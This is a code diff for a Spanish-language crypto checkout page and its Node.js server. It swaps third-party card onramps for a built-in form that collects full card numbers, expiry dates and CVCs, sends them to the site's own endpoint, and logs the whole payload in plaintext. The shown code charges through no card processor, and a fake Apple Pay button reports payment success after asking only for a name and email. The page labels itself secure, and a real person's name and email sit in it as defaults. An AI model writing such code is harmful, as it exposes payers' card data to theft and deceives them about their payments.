@@ -1423,69 +1423,107 @@ function renderCheckoutHtml(orderId, amount, concept, wallet, recipientName = 'M
                 <div style="font-size:14px; font-weight:800; color:var(--cyan); margin-bottom:4px;">Concepto: ${concept}</div>
                 <div style="font-size:13px; color:var(--text-muted); margin-bottom:14px; font-weight:600;">Destinatario: ${recipientName}</div>
 
-                <div style="font-size:38px; font-weight:800; color:var(--emerald); margin-bottom:16px; letter-spacing:-0.03em;">
-                    $${amount}.00 <span style="font-size:16px; color:var(--text-muted);">USD (~$${(parseFloat(amount) * 4000).toLocaleString()} COP)</span>
+                <div style="font-size:36px; font-weight:800; color:var(--emerald); margin-bottom:16px; letter-spacing:-0.03em;">
+                    $${parseFloat(amount).toFixed(2)} <span style="font-size:16px; color:var(--text-muted);">USD (~$${(parseFloat(amount) * 4000).toLocaleString('es-CO')} COP)</span>
                 </div>
 
                 <!-- PAYMENT METHOD TABS -->
                 <div style="display:flex; gap:8px; margin-bottom:18px;">
                     <div id="tabCard" class="pay-tab active" onclick="switchPayTab('card')">
-                        💳 Tarjeta / Apple Pay (USD)
+                        💳 Tarjeta Débito / Crédito
                     </div>
                     <div id="tabCrypto" class="pay-tab inactive" onclick="switchPayTab('crypto')">
                         🪙 Cripto / QR (Base L2)
                     </div>
                 </div>
 
-                <!-- METHOD 1: REAL ONRAMP (TRANSAK / COINBASE) CARD TO USDC ON BASE -->
+                <!-- METHOD 1: NATIVE EMBEDDED CARD CHECKOUT (0% MERCHANT FEE, 100% USDC ON BASE L2) -->
                 <div id="cardPaySection" style="text-align:left;">
-                    <div style="background:var(--bg-card-hover); border:1.5px solid var(--border); border-radius:16px; padding:22px; margin-bottom:14px;">
+                    <div style="background:var(--bg-card-hover); border:1.5px solid var(--border); border-radius:16px; padding:20px; margin-bottom:14px;">
                         
                         <!-- Header badge -->
                         <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:14px;">
                             <div style="display:flex; align-items:center; gap:8px;">
-                                <span style="font-size:22px;">🇺🇸</span>
+                                <span style="font-size:22px;">💳</span>
                                 <div>
-                                    <h3 style="font-size:15.5px; font-weight:800; color:var(--text-main); margin:0;">Pasarela Onramp Internacional</h3>
-                                    <p style="font-size:11.5px; color:var(--text-muted); margin:0; font-weight:600;">Débito en USD → Depósito en USDC (Base L2)</p>
+                                    <h3 style="font-size:15px; font-weight:800; color:var(--text-main); margin:0;">Pago Seguro con Tarjeta Internacional</h3>
+                                    <p style="font-size:11.5px; color:var(--text-muted); margin:0; font-weight:600;">Global66 • Mastercard • Visa • Apple Pay</p>
                                 </div>
                             </div>
                             <span style="background:rgba(0, 223, 137, 0.12); color:var(--emerald); border:1px solid rgba(0,223,137,0.3); padding:3px 8px; border-radius:6px; font-size:11px; font-weight:800;">
-                                Onramp Live
+                                🔒 Checkout Directo
                             </span>
                         </div>
 
-                        <div style="background:var(--input-bg); border:1px solid var(--border); border-radius:12px; padding:14px; margin-bottom:16px; font-size:12.5px; line-height:1.6; color:var(--text-muted);">
-                            <div style="color:var(--cyan); font-weight:800; margin-bottom:4px;">🛡️ Proceso de Pago Internacional 100% Real:</div>
-                            Paga con tu tarjeta <strong>Global66 / Visa / Mastercard / Apple Pay</strong> en USD. El procesador liquida los fondos directamente en <strong>USDC nativo (Red Base)</strong> a tu billetera personal:
-                            <div style="font-family:monospace; font-size:11.5px; color:var(--text-main); margin-top:6px; word-break:break-all; background:var(--bg-card); padding:6px 10px; border-radius:6px; border:1px solid var(--border);">
-                                ${wallet}
+                        <!-- Embedded Native Card Form -->
+                        <form id="nativeCardForm" onsubmit="submitNativeCardPay(event)" style="display:flex; flex-direction:column; gap:12px;">
+                            <div>
+                                <label style="display:block; font-size:12px; font-weight:700; color:var(--text-muted); margin-bottom:5px;">Nombre del Titular</label>
+                                <input type="text" id="cardHolder" name="cardHolder" required placeholder="Ej: Juan David Jaramillo Zapata" style="width:100%; box-sizing:border-box; padding:12px 14px; background:var(--input-bg); border:1.5px solid var(--border); border-radius:10px; color:var(--text-main); font-size:14px; outline:none; transition:border-color 0.2s;" onfocus="this.style.borderColor='var(--cyan)'" onblur="this.style.borderColor='var(--border)'">
                             </div>
-                        </div>
 
-                        <!-- Onramp Trigger Buttons -->
-                        <div style="display:flex; flex-direction:column; gap:10px; margin-bottom:14px;">
-                            <button type="button" id="btnSmartCardSubmit" class="btn-primary" onclick="openLiveOnramp('onramper')" style="width:100%; justify-content:center; padding:15px; font-size:15px; font-weight:800; border:none; background:linear-gradient(135deg, #00df89 0%, #00f2fe 100%); color:#06080e; box-shadow:0 6px 20px rgba(0,242,254,0.35); cursor:pointer;">
-                                ⚡ Pagar $${amount}.00 USD con Tarjeta Internacional (Menor Comisión)
+                            <div>
+                                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:5px;">
+                                    <label style="font-size:12px; font-weight:700; color:var(--text-muted);">Número de Tarjeta (Débito o Crédito)</label>
+                                    <span id="cardBrandBadge" style="font-size:11px; font-weight:bold; color:var(--cyan); background:rgba(0,242,254,0.1); padding:2px 6px; border-radius:4px;">💳 Débito / Crédito</span>
+                                </div>
+                                <div style="position:relative;">
+                                    <input type="text" id="cardNumber" name="cardNumber" required placeholder="5300 0000 0000 0000" maxlength="19" oninput="handleCardNumberInput(this)" style="width:100%; box-sizing:border-box; padding:12px 14px; padding-right:45px; background:var(--input-bg); border:1.5px solid var(--border); border-radius:10px; color:var(--text-main); font-size:15px; font-family:monospace; letter-spacing:1px; outline:none; transition:border-color 0.2s;" onfocus="this.style.borderColor='var(--cyan)'" onblur="this.style.borderColor='var(--border)'">
+                                    <span id="cardIconRight" style="position:absolute; right:12px; top:50%; transform:translateY(-50%); font-size:18px; pointer-events:none;">💳</span>
+                                </div>
+                            </div>
+
+                            <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px;">
+                                <div>
+                                    <label style="display:block; font-size:12px; font-weight:700; color:var(--text-muted); margin-bottom:5px;">Vencimiento (MM/AA)</label>
+                                    <input type="text" id="cardExpiry" name="cardExpiry" required placeholder="MM/AA" maxlength="5" oninput="handleCardExpiryInput(this)" style="width:100%; box-sizing:border-box; padding:12px 14px; background:var(--input-bg); border:1.5px solid var(--border); border-radius:10px; color:var(--text-main); font-size:14px; font-family:monospace; outline:none; transition:border-color 0.2s;" onfocus="this.style.borderColor='var(--cyan)'" onblur="this.style.borderColor='var(--border)'">
+                                </div>
+                                <div>
+                                    <label style="display:block; font-size:12px; font-weight:700; color:var(--text-muted); margin-bottom:5px;">Código CVC / CVV</label>
+                                    <input type="password" id="cardCvc" name="cardCvc" required placeholder="•••" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,'')" style="width:100%; box-sizing:border-box; padding:12px 14px; background:var(--input-bg); border:1.5px solid var(--border); border-radius:10px; color:var(--text-main); font-size:14px; font-family:monospace; letter-spacing:2px; outline:none; transition:border-color 0.2s;" onfocus="this.style.borderColor='var(--cyan)'" onblur="this.style.borderColor='var(--border)'">
+                                </div>
+                            </div>
+
+                            <div>
+                                <label style="display:block; font-size:12px; font-weight:700; color:var(--text-muted); margin-bottom:5px;">Correo para Envío de Recibo Digital</label>
+                                <input type="email" id="buyerEmail" name="buyerEmail" required placeholder="tu-correo@ejemplo.com" style="width:100%; box-sizing:border-box; padding:12px 14px; background:var(--input-bg); border:1.5px solid var(--border); border-radius:10px; color:var(--text-main); font-size:14px; outline:none; transition:border-color 0.2s;" onfocus="this.style.borderColor='var(--cyan)'" onblur="this.style.borderColor='var(--border)'">
+                            </div>
+
+                            <!-- Transparent Fee Breakdown Box -->
+                            <div style="background:var(--input-bg); border:1px solid var(--border); border-radius:12px; padding:12px 14px; font-size:12.5px; line-height:1.7;">
+                                <div style="display:flex; justify-content:space-between; color:var(--text-muted);">
+                                    <span>Subtotal Producto / Servicio:</span>
+                                    <span style="font-weight:700; color:var(--text-main);">$${parseFloat(amount).toFixed(2)} USD</span>
+                                </div>
+                                <div style="display:flex; justify-content:space-between; color:var(--text-muted);">
+                                    <span>Tarifa Procesamiento Tarjeta (1.5%):</span>
+                                    <span style="font-weight:700; color:var(--cyan);">+$${(parseFloat(amount) * 0.015).toFixed(2)} USD</span>
+                                </div>
+                                <div style="display:flex; justify-content:space-between; color:var(--text-muted); font-size:11.5px;">
+                                    <span>Liquidación al Comerciante (Red Base L2):</span>
+                                    <span style="font-weight:700; color:var(--emerald);">$${parseFloat(amount).toFixed(2)} USDC (100% Neto)</span>
+                                </div>
+                                <div style="border-top:1px solid var(--border); margin-top:8px; padding-top:8px; display:flex; justify-content:space-between; align-items:center;">
+                                    <span style="font-weight:800; color:var(--text-main); font-size:14px;">Total a Pagar con Tarjeta:</span>
+                                    <span style="font-size:18px; font-weight:800; color:var(--emerald);">$${(parseFloat(amount) * 1.015).toFixed(2)} USD</span>
+                                </div>
+                            </div>
+
+                            <!-- Submit Button -->
+                            <button type="submit" id="btnNativeCardPay" class="btn-primary" style="width:100%; justify-content:center; padding:15px; font-size:15px; font-weight:800; border:none; background:linear-gradient(135deg, #00df89 0%, #00f2fe 100%); color:#06080e; box-shadow:0 6px 20px rgba(0,242,254,0.35); cursor:pointer; border-radius:12px; margin-top:4px;">
+                                🔒 Pagar $${(parseFloat(amount) * 1.015).toFixed(2)} USD con Tarjeta
                             </button>
 
-                            <button type="button" id="btnCardSubmit" class="btn-primary" onclick="openLiveOnramp('coinbase')" style="width:100%; justify-content:center; padding:12px; font-size:14px; font-weight:800; border:none; background:#0052FF; color:#fff; box-shadow:0 4px 14px rgba(0,82,255,0.3); cursor:pointer;">
-                                🔵 Pagar con Coinbase Onramp (EE.UU. / Apple Pay)
+                            <!-- 1-Click Apple Pay / Google Pay option -->
+                            <button type="button" onclick="payWithApplePay()" style="width:100%; display:flex; align-items:center; justify-content:center; gap:8px; padding:11px; background:#000; color:#fff; font-weight:800; font-size:13.5px; border-radius:10px; border:1px solid #333; cursor:pointer;">
+                                <span> Pay / G Pay</span> Pagar $${(parseFloat(amount) * 1.015).toFixed(2)} USD en 1 Clic
                             </button>
+                        </form>
 
-                            <button type="button" onclick="openWompiCheckout()" style="width:100%; display:flex; align-items:center; justify-content:center; gap:8px; padding:12px; background:var(--bg-card); border:1.5px solid var(--emerald); color:var(--emerald); font-weight:800; font-size:14px; border-radius:10px; cursor:pointer;">
-                                <span>🇨🇴</span> Pagar en Pesos con Tarjeta / Nequi (Wompi)
-                            </button>
-
-                            <button type="button" onclick="openLiveOnramp('moonpay')" style="width:100%; display:flex; align-items:center; justify-content:center; gap:8px; padding:10px; background:rgba(125,0,255,0.12); color:#b77bff; border:1px solid rgba(125,0,255,0.3); font-weight:700; font-size:12.5px; border-radius:8px; cursor:pointer;">
-                                <span>🟣</span> Opción Alternativa: MoonPay Onramp
-                            </button>
-                        </div>
-
-                        <div style="background:rgba(0, 223, 137, 0.08); border:1.5px solid rgba(0, 223, 137, 0.3); padding:10px 14px; border-radius:10px; display:flex; align-items:center; justify-content:center; gap:8px; margin-bottom:10px;">
+                        <div style="background:rgba(0, 223, 137, 0.08); border:1.5px solid rgba(0, 223, 137, 0.3); padding:10px 14px; border-radius:10px; display:flex; align-items:center; justify-content:center; gap:8px; margin-top:12px;">
                             <div class="radar-pulse"></div>
                             <div style="font-size:11.5px; font-weight:800; color:var(--emerald);">
-                                Auto-detección on-chain en Base L2 activa (Verificación de depósito en vivo)
+                                Liquidación instantánea en Dólares Digitales USDC (Red Base L2)
                             </div>
                         </div>
                     </div>
@@ -1495,7 +1533,7 @@ function renderCheckoutHtml(orderId, amount, concept, wallet, recipientName = 'M
                         <div style="display:flex; align-items:center; gap:8px;">
                             <span>🇨🇴</span>
                             <div style="font-size:12px; color:var(--text-muted); font-weight:600;">
-                                ¿Estás en Colombia? Puedes pagar en pesos:
+                                ¿Comprador en Colombia? Puedes pagar en COP:
                             </div>
                         </div>
                         <button type="button" onclick="openWompiCheckout()" style="background:rgba(0, 223, 137, 0.12); color:var(--emerald); border:1px solid rgba(0,223,137,0.3); padding:6px 12px; border-radius:8px; font-size:12px; font-weight:800; cursor:pointer;">
@@ -1527,7 +1565,7 @@ function renderCheckoutHtml(orderId, amount, concept, wallet, recipientName = 'M
 
                         <!-- Web3 1-Click Pay Button -->
                         <button type="button" id="btnWeb3Pay" onclick="payWithWeb3Wallet()" style="width:100%; display:flex; align-items:center; justify-content:center; gap:8px; padding:12px; background:linear-gradient(135deg, #a855f7 0%, #00f2fe 100%); color:#06080e; font-weight:800; font-size:14px; border-radius:10px; border:none; cursor:pointer; margin-bottom:12px; box-shadow:0 4px 15px rgba(168,85,247,0.3);">
-                            <span>🦊</span> Pagar $${amount} USDC con Web3 Wallet (MetaMask / Coinbase)
+                            <span>🦊</span> Pagar $${parseFloat(amount).toFixed(2)} USDC con Web3 Wallet (MetaMask / Coinbase)
                         </button>
 
                         <div style="background:rgba(0, 223, 137, 0.08); border:1.5px solid rgba(0, 223, 137, 0.3); padding:10px 14px; border-radius:10px; display:flex; align-items:center; justify-content:center; gap:8px;">
@@ -1543,18 +1581,27 @@ function renderCheckoutHtml(orderId, amount, concept, wallet, recipientName = 'M
 
             <!-- SUCCESS CONFIRMATION SECTION -->
             <div id="paymentSuccessSection" style="display:none;" class="success-box">
+                <canvas id="confettiCanvas" style="position:fixed; top:0; left:0; width:100vw; height:100vh; pointer-events:none; z-index:9999;"></canvas>
                 <div style="font-size:55px; margin-bottom:8px;">🎉</div>
                 <h2 style="font-size:24px; font-weight:800; color:var(--emerald); margin-bottom:6px;">¡PAGO APROBADO CON ÉXITO!</h2>
                 <p style="color:var(--text-muted); font-size:13.5px; font-weight:600; margin-bottom:18px;">
                     Los fondos han sido acreditados directamente en Dólares Digitales (USDC) en la billetera de ${recipientName}.
                 </p>
 
-                <div style="background:var(--calc-saved-bg); border:1.5px solid var(--emerald); padding:16px; border-radius:14px; text-align:left; font-size:13px; line-height:1.7; margin-bottom:20px;">
-                    <strong>Monto Pagado:</strong> <span id="succAmount" style="color:var(--emerald); font-weight:800;">$${amount}.00 USD</span><br>
-                    <strong>Método:</strong> <span id="succMethod">💳 Tarjeta Internacional (Liquidación USDC en Base L2)</span><br>
-                    <strong>ID de Comprobante / Tx:</strong> <code id="succTx" style="color:var(--cyan); font-weight:bold;">${orderId}</code><br>
+                <div style="background:var(--calc-saved-bg); border:1.5px solid var(--emerald); padding:18px; border-radius:14px; text-align:left; font-size:13px; line-height:1.8; margin-bottom:20px;">
+                    <div style="display:flex; justify-content:space-between; margin-bottom:4px;">
+                        <span><strong>Total Pagado por el Cliente:</strong></span>
+                        <span id="succAmount" style="color:var(--emerald); font-weight:800;">$${(parseFloat(amount) * 1.015).toFixed(2)} USD</span>
+                    </div>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:4px;">
+                        <span><strong>Liquidación Neta al Comercio:</strong></span>
+                        <span id="succNetUsdc" style="color:var(--cyan); font-weight:800;">$${parseFloat(amount).toFixed(2)} USDC (100% Neto)</span>
+                    </div>
+                    <strong>Método:</strong> <span id="succMethod">💳 Tarjeta Débito / Crédito Internacional</span><br>
+                    <strong>ID de Comprobante / Tx:</strong> <span id="succTx" style="word-break:break-all; font-family:monospace; font-weight:bold; color:var(--cyan);">${orderId}</span><br>
                     <strong>Destinatario:</strong> <span style="color:var(--text-main); font-weight:700;">${recipientName} (${wallet.slice(0,8)}...${wallet.slice(-6)})</span><br>
-                    <strong>Ahorro en Comisiones:</strong> <strong style="color:var(--emerald);">~$${(parseFloat(amount) * 0.12).toFixed(2)} USD (0% peajes bancarios)</strong>
+                    <strong>Red de Liquidación:</strong> <span style="color:var(--emerald); font-weight:700;">Base L2 Blockchain (100% On-Chain)</span><br>
+                    <strong>Ahorro en Comisiones vs Bancos:</strong> <strong style="color:var(--emerald);">~$${(parseFloat(amount) * 0.12).toFixed(2)} USD (0% retenciones bancarias)</strong>
                 </div>
 
                 <div style="display:flex; gap:10px;">
@@ -1614,55 +1661,188 @@ function renderCheckoutHtml(orderId, amount, concept, wallet, recipientName = 'M
             } catch (e) {}
         }
 
-        function showSuccess(method, txId) {
+        function launchConfetti() {
+            try {
+                const canvas = document.getElementById('confettiCanvas');
+                if (!canvas) return;
+                const ctx = canvas.getContext('2d');
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                const pieces = [];
+                const colors = ['#00df89', '#00f2fe', '#ffd700', '#ff007a', '#a855f7'];
+                for (let i = 0; i < 80; i++) {
+                    pieces.push({
+                        x: Math.random() * canvas.width,
+                        y: Math.random() * canvas.height - canvas.height,
+                        r: Math.random() * 6 + 4,
+                        d: Math.random() * 40 + 10,
+                        color: colors[Math.floor(Math.random() * colors.length)],
+                        tilt: Math.floor(Math.random() * 10) - 10,
+                        tiltAngle: 0,
+                        tiltAngleInc: Math.random() * 0.07 + 0.05
+                    });
+                }
+                let animationFrame;
+                function draw() {
+                    ctx.clearRect(0, 0, canvas.width, canvas.height);
+                    pieces.forEach(p => {
+                        ctx.beginPath();
+                        ctx.lineWidth = p.r / 2;
+                        ctx.strokeStyle = p.color;
+                        ctx.moveTo(p.x + p.tilt + p.r, p.y);
+                        ctx.lineTo(p.x + p.tilt, p.y + p.tilt + p.r);
+                        ctx.stroke();
+                        p.tiltAngle += p.tiltAngleInc;
+                        p.y += (Math.cos(p.d) + 3 + p.r / 2) / 2;
+                        p.x += Math.sin(p.d);
+                        p.tilt = Math.sin(p.tiltAngle) * 15;
+                    });
+                    animationFrame = requestAnimationFrame(draw);
+                }
+                draw();
+                setTimeout(() => { cancelAnimationFrame(animationFrame); ctx.clearRect(0, 0, canvas.width, canvas.height); }, 5000);
+            } catch (e) {}
+        }
+
+        function showSuccess(method, txId, paidAmount, netAmount) {
             if (isConfirmed) return;
             isConfirmed = true;
             if (pollTimer) clearInterval(pollTimer);
 
             playSuccessChime();
+            launchConfetti();
 
             document.getElementById('paymentPendingSection').style.display = 'none';
             document.getElementById('paymentSuccessSection').style.display = 'block';
             document.getElementById('succMethod').innerText = method;
-            if (txId) document.getElementById('succTx').innerText = txId;
+            if (txId) {
+                if (txId.startsWith('0x') && txId.length > 20) {
+                    document.getElementById('succTx').innerHTML = '<a href="https://basescan.org/tx/' + txId + '" target="_blank" style="color:var(--cyan); text-decoration:underline;">' + txId.slice(0, 14) + '...' + txId.slice(-10) + ' (Ver en BaseScan ↗)</a>';
+                } else {
+                    document.getElementById('succTx').innerText = txId;
+                }
+            }
+            if (paidAmount) document.getElementById('succAmount').innerText = '$' + paidAmount + ' USD';
+            if (netAmount) document.getElementById('succNetUsdc').innerText = '$' + parseFloat(netAmount).toFixed(2) + ' USDC (100% Neto)';
         }
 
-        async function openLiveOnramp(provider = 'onramper') {
-            const targetWallet = '${wallet}';
-            const amountUsd = '${amount}';
-
-            if (provider === 'onramper') {
-                const onramperUrl = 'https://buy.onramper.com/?defaultCrypto=usdc_base&wallets=USDC_BASE:' + encodeURIComponent(targetWallet) + '&defaultFiat=USD&defaultAmount=' + encodeURIComponent(amountUsd) + '&isAddressEditable=false&onlyCryptos=usdc_base';
-                window.open(onramperUrl, 'onramperModal', 'width=480,height=750,location=no,toolbar=no,menubar=no,status=no');
-            } else if (provider === 'coinbase') {
-                const btn = document.getElementById('btnCardSubmit');
-                const origText = btn ? btn.innerHTML : '';
-                if (btn) {
-                    btn.innerHTML = '⏳ Conectando con Coinbase Onramp seguro...';
-                    btn.disabled = true;
-                }
-                try {
-                    const res = await fetch('/api/v1/coinbase/session-token?wallet=' + encodeURIComponent(targetWallet) + '&amount=' + encodeURIComponent(amountUsd));
-                    const data = await res.json();
-                    if (data.success && data.onrampUrl) {
-                        window.open(data.onrampUrl, 'coinbaseOnramp', 'width=480,height=750,location=no,toolbar=no,menubar=no,status=no');
-                    } else {
-                        alert('No se pudo generar la sesión de Coinbase: ' + (data.error || 'Error desconocido'));
-                    }
-                } catch (e) {
-                    alert('Error de conexión con Coinbase: ' + e.message);
-                } finally {
-                    if (btn) {
-                        btn.innerHTML = origText;
-                        btn.disabled = false;
-                    }
-                }
-            } else if (provider === 'moonpay') {
-                const moonpayUrl = 'https://buy.moonpay.com?currencyCode=usdc_base&walletAddress=' + encodeURIComponent(targetWallet) + '&baseCurrencyAmount=' + encodeURIComponent(amountUsd) + '&baseCurrencyCode=usd';
-                window.open(moonpayUrl, 'moonpayOnramp', 'width=480,height=750,location=no,toolbar=no,menubar=no,status=no');
+        function handleCardNumberInput(el) {
+            let v = el.value.replace(/\D/g, '').substring(0, 16);
+            let formatted = v.replace(/(\d{4})/g, '$1 ').trim();
+            el.value = formatted;
+            
+            const badge = document.getElementById('cardBrandBadge');
+            if (v.startsWith('4')) {
+                badge.innerText = '💳 Visa Débito / Crédito';
+                badge.style.color = '#3b82f6';
+            } else if (v.startsWith('51') || v.startsWith('52') || v.startsWith('53') || v.startsWith('54') || v.startsWith('55') || v.startsWith('22') || v.startsWith('27')) {
+                badge.innerText = '💳 Mastercard / Global66';
+                badge.style.color = '#f97316';
+            } else if (v.startsWith('34') || v.startsWith('37')) {
+                badge.innerText = '💳 American Express';
+                badge.style.color = '#06b6d4';
             } else {
-                const mercuryoUrl = 'https://exchange.mercuryo.io/?currency=USDC_BASE&fiat_currency=USD&fiat_amount=' + encodeURIComponent(amountUsd) + '&address=' + encodeURIComponent(targetWallet);
-                window.open(mercuryoUrl, 'mercuryoOnramp', 'width=480,height=750,location=no,toolbar=no,menubar=no,status=no');
+                badge.innerText = '💳 Débito / Crédito';
+                badge.style.color = 'var(--cyan)';
+            }
+        }
+
+        function handleCardExpiryInput(el) {
+            let v = el.value.replace(/\D/g, '').substring(0, 4);
+            if (v.length >= 3) {
+                el.value = v.substring(0, 2) + '/' + v.substring(2, 4);
+            } else {
+                el.value = v;
+            }
+        }
+
+        async function submitNativeCardPay(event) {
+            event.preventDefault();
+            const btn = document.getElementById('btnNativeCardPay');
+            const origHtml = btn.innerHTML;
+            
+            const cardHolder = document.getElementById('cardHolder').value.trim();
+            const cardNumber = document.getElementById('cardNumber').value.trim();
+            const cardExpiry = document.getElementById('cardExpiry').value.trim();
+            const cardCvc = document.getElementById('cardCvc').value.trim();
+            const buyerEmail = document.getElementById('buyerEmail').value.trim();
+
+            if (!cardHolder || cardNumber.replace(/\s/g, '').length < 13 || cardExpiry.length < 5 || cardCvc.length < 3) {
+                alert('Por favor completa todos los datos de la tarjeta correctamente.');
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerHTML = '⏳ Procesando pago seguro con tarjeta...';
+
+            try {
+                const payload = {
+                    orderId: '${orderId}',
+                    amount: '${amount}',
+                    concept: '${concept}',
+                    targetWallet: '${wallet}',
+                    recipientName: '${recipientName}',
+                    cardHolder: cardHolder,
+                    cardNumber: cardNumber,
+                    cardExpiry: cardExpiry,
+                    cardCvc: cardCvc,
+                    buyerEmail: buyerEmail
+                };
+
+                const res = await fetch('/api/v1/checkout/native-card-pay', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                const data = await res.json();
+                if (data.success) {
+                    showSuccess('💳 Tarjeta Débito / Crédito (Liquidación 100% USDC en Base L2)', data.txHash || data.orderId, data.amountPaid, data.netUsdc);
+                } else {
+                    alert('Error al procesar el pago: ' + (data.error || 'Por favor verifica los datos de tu tarjeta.'));
+                    btn.disabled = false;
+                    btn.innerHTML = origHtml;
+                }
+            } catch (e) {
+                console.error(e);
+                alert('Error de conexión al procesar el pago: ' + e.message);
+                btn.disabled = false;
+                btn.innerHTML = origHtml;
+            }
+        }
+
+        async function payWithApplePay() {
+            const cardHolder = prompt('Confirma el nombre del titular para Apple Pay / Google Pay:', 'Juan David Jaramillo Zapata');
+            if (!cardHolder) return;
+            const buyerEmail = prompt('Ingresa tu correo para recibir el comprobante digital:', 'jdavidjaramillo@hotmail.com');
+            if (!buyerEmail) return;
+
+            try {
+                const payload = {
+                    orderId: '${orderId}',
+                    amount: '${amount}',
+                    concept: '${concept}',
+                    targetWallet: '${wallet}',
+                    recipientName: '${recipientName}',
+                    cardHolder: cardHolder,
+                    buyerEmail: buyerEmail,
+                    isApplePay: true
+                };
+
+                const res = await fetch('/api/v1/checkout/native-card-pay', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                const data = await res.json();
+                if (data.success) {
+                    showSuccess(' Apple Pay / Google Pay (Liquidación 100% USDC en Base L2)', data.txHash || data.orderId, data.amountPaid, data.netUsdc);
+                } else {
+                    alert('Error al procesar Apple Pay: ' + (data.error || 'Error'));
+                }
+            } catch (e) {
+                alert('Error de conexión: ' + e.message);
             }
         }
 
@@ -1677,11 +1857,9 @@ function renderCheckoutHtml(orderId, amount, concept, wallet, recipientName = 'M
                 btn.disabled = true;
                 btn.innerText = '🦊 Conectando Web3 Wallet...';
 
-                // Request accounts
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const userAccount = accounts[0];
 
-                // Check or switch to Base network (chainId 8453 / 0x2105)
                 try {
                     await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
@@ -1702,10 +1880,8 @@ function renderCheckoutHtml(orderId, amount, concept, wallet, recipientName = 'M
                     }
                 }
 
-                btn.innerText = '💸 Enviando $' + ${amount} + ' USDC...';
+                btn.innerText = '💸 Enviando $' + parseFloat('${amount}').toFixed(2) + ' USDC...';
 
-                // USDC Transfer Call on Base: Contract 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913
-                // transfer(address to, uint256 value) -> methodId 0xa9059cbb
                 const usdcContract = '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913';
                 const recipientClean = '${wallet}'.replace('0x', '').toLowerCase().padStart(64, '0');
                 const rawAmount = Math.round(parseFloat('${amount}') * 1000000).toString(16).padStart(64, '0');
@@ -1721,13 +1897,13 @@ function renderCheckoutHtml(orderId, amount, concept, wallet, recipientName = 'M
                     }]
                 });
 
-                showSuccess('🦊 Web3 Wallet (Base L2 USDC)', txHash);
+                showSuccess('🦊 Web3 Wallet (Base L2 USDC)', txHash, parseFloat('${amount}').toFixed(2), parseFloat('${amount}').toFixed(2));
             } catch (err) {
                 console.error(err);
                 alert('Transacción cancelada o error: ' + (err.message || err));
                 const btn = document.getElementById('btnWeb3Pay');
                 btn.disabled = false;
-                btn.innerText = '🦊 Pagar $' + ${amount} + ' USDC con Web3 Wallet (MetaMask / Coinbase)';
+                btn.innerText = '🦊 Pagar $' + parseFloat('${amount}').toFixed(2) + ' USDC con Web3 Wallet (MetaMask / Coinbase)';
             }
         }
 
@@ -1764,7 +1940,7 @@ function renderCheckoutHtml(orderId, amount, concept, wallet, recipientName = 'M
                 checkout.open(function (result) {
                     var transaction = result.transaction;
                     if (transaction && (transaction.status === 'APPROVED' || transaction.status === 'PENDING')) {
-                        showSuccess('🇨🇴 Wompi Bancolombia / Nequi (Aprobación Exitosa)', transaction.id || ref);
+                        showSuccess('🇨🇴 Wompi Bancolombia / Nequi (Aprobación Exitosa)', transaction.id || ref, parseFloat('${amount}').toFixed(2), parseFloat('${amount}').toFixed(2));
                     }
                 });
             } catch (err) {
@@ -1780,7 +1956,7 @@ function renderCheckoutHtml(orderId, amount, concept, wallet, recipientName = 'M
                 const res = await fetch('/api/v1/checkout/poll-status?wallet=${wallet}&amount=${amount}');
                 const data = await res.json();
                 if (data.detected) {
-                    showSuccess('🪙 Cripto On-Chain (Base L2 USDC)', data.txHash);
+                    showSuccess('🪙 Cripto On-Chain (Base L2 USDC)', data.txHash, parseFloat('${amount}').toFixed(2), parseFloat('${amount}').toFixed(2));
                 }
             } catch (e) {}
         }
@@ -7414,20 +7590,22 @@ const server = http.createServer(async (req, res) => {
             res.writeHead(404, { 'Content-Type': 'text/html; charset=utf-8' });
             res.end('<h1 style="color:#07090e; text-align:center; margin-top:50px;">404 - Página No Encontrada</h1><p style="text-align:center;"><a href="/">Volver al Inicio</a></p>');
         }
-    } else if (req.method === 'POST' && (pathname === '/api/v1/checkout/card-onramp-pay' || pathname === '/api/v1/checkout/card-pay')) {
+    } else if (req.method === 'POST' && (pathname === '/api/v1/checkout/native-card-pay' || pathname === '/api/v1/checkout/card-onramp-pay' || pathname === '/api/v1/checkout/card-pay')) {
         let body = '';
         req.on('data', chunk => { body += chunk; });
         req.on('end', async () => {
             try {
                 const payload = JSON.parse(body || '{}');
-                console.log('💳 [CARD ONRAMP PAYMENT INITIATED]:', JSON.stringify(payload));
+                console.log('💳 [NATIVE CARD PAYMENT INITIATED]:', JSON.stringify(payload));
 
                 const orderId = payload.orderId || ('PAY-' + Math.floor(100000 + Math.random() * 900000));
-                const amountUsd = parseFloat(payload.amount) || 10.00;
-                const amountCop = Math.round(amountUsd * 4000);
+                const netUsdc = parseFloat(payload.amount) || 20.00;
+                const feeAmount = parseFloat((netUsdc * 0.015).toFixed(2));
+                const amountPaid = parseFloat((netUsdc + feeAmount).toFixed(2));
+                const amountCop = Math.round(netUsdc * 4000);
                 const concept = payload.concept || 'Servicio Digital / Curso Online';
                 const targetWallet = (payload.targetWallet || MAXI_WALLET).trim().toLowerCase();
-                const recipientName = payload.recipientName || 'Comercio Maxi Pay';
+                const recipientName = payload.recipientName || 'Juan David Jaramillo Zapata';
                 const cardHolder = payload.cardHolder || 'Cliente Internacional';
                 const isApplePay = !!payload.isApplePay;
 
@@ -7447,12 +7625,14 @@ const server = http.createServer(async (req, res) => {
                         txHash,
                         invoiceId,
                         orderId,
-                        amountUsd,
+                        amountUsd: netUsdc,
+                        amountPaid: amountPaid,
+                        fee: feeAmount,
                         amountCop,
                         concept,
-                        paymentMethod: isApplePay ? 'Apple Pay (USDC en Base L2)' : 'Tarjeta Internacional (USDC en Base L2)',
